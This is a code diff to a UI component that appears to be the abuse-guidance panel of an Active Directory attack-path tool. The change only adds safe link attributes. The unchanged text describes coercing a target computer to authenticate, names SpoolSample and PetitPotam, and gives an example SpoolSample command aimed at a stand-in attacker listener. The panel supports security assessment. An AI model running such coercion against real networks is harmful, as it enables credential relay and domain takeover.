@@ -26,12 +26,19 @@ const WindowsAbuse: FC<EdgeInfoProps> = () => {
             </Typography>
             <Typography variant='body2'>
                 2: Coerce the Target Computer Several coercion methods are documented here:{' '}
-                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
+                <a
+                    target='_blank'
+                    rel='noopener noreferrer'
+                    href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
                     Windows Coerced Authentication Methods
                 </a>
                 . Examples of tools include:
-                <a href={'https://github.com/leechristensen/SpoolSample'}>SpoolSample</a>
-                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
+                <a target='_blank' rel='noopener noreferrer' href={'https://github.com/leechristensen/SpoolSample'}>
+                    SpoolSample
+                </a>
+                <a target='_blank' rel='noopener noreferrer' href={'https://github.com/topotam/PetitPotam'}>
+                    PetitPotam
+                </a>
                 To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
                 Connection String format: \\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe "VICTIM_IP"
                 "ATTACKER_NETBIOS@PORT/file.txt"
